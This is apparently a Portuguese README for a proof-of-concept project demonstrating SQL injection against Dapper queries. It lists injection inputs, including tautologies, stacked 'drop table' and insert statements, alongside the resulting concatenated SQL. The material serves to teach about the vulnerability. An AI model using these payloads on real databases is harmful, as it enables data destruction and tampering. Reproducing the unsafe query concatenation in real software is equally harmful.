# POC 2

- (back-end ) POC abordando conceito de SQL Injection utilizando o dapper.

By Guilherme Lima - guyga89@gmail.com

# TesteUm

- input: ' or ''='
- resultado: SELECT \* FROM Produto where descricao = '' or ''=''

- input: ' drop table Teste--
- resultado: SELECT \* FROM Produto where descricao = '' drop table Teste--'

- input: ' Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())--
- resultado: SELECT \* FROM Produto where descricao = '' Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())--'

# TesteDois

- 1;drop table Teste--
- 1;drop table Teste
- SELECT \* FROM Produto where id = 1;drop table Teste

- 1 or 1=1
- SELECT \* FROM Produto where id = 1 or 1=1

- 1; Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())--
- 1; Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())
- SELECT \* FROM Produto where id = 1; Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())

# TesteTres

- 1'; Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate()) --

- '; Insert into Teste (Descricao, DataCadastro)

# TesteQuatro

- '; Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())--
- SELECT \* FROM Produto where Descricao like '%'; Insert into Teste (Descricao, DataCadastro) Values ('teste',getdate())--%'"
